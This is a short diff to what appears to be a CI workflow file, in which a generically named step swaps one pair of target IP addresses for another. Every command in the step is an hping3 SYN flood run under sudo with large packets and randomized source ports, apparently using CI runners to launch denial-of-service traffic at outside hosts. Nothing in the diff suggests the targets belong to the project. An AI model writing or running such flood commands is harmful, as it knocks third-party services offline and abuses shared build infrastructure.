@@ -61,5 +61,8 @@ jobs:
 
       - name: Step 2
         run: |
-          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.11 || true
-          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.12 || true
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.11 || true
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.12 || true
+
+          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 104.26.0.42 || true
+          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 104.26.1.42 || true
